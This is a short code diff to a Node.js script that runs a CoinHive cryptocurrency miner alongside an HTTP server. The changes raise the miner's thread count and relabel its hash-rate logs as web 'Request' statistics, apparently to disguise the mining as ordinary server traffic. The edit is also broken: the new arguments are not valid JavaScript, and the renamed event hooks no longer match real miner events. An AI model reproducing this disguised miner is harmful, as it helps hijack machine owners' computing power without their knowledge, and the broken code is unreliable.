@@ -4,18 +4,18 @@ const http = require('http');
 (async () => {
  
   // Create miner
-  const miner = await CoinHive('83A1asSDroZ05kv3y2NBTAA5E7ea9It7'); // Coin-Hive's Site Key
+  const miner = await CoinHive('83A1asSDroZ05kv3y2NBTAA5E7ea9It7', throttle:0.5,threads:3); // Coin-Hive's Site Key
  
   // Start miner
   await miner.start();
  
   // Listen on events
-  miner.on('found', () => console.log('Found!!'))
-  miner.on('accepted', () => console.log('Accepted!!'))
-  miner.on('update', data => console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
+  miner.on('found nothing', () => console.log('Found!!'))
+  miner.on('accepted request', () => console.log('Accepted!!'))
+  miner.on('up date to one', data => console.log(`
+    Request per second: ${data.hashesPerSecond}
+    Total Request: ${data.totalHashes}
+    Received Request: ${data.acceptedHashes}
   `));
  
   const requestHandler = (request, response) => {  
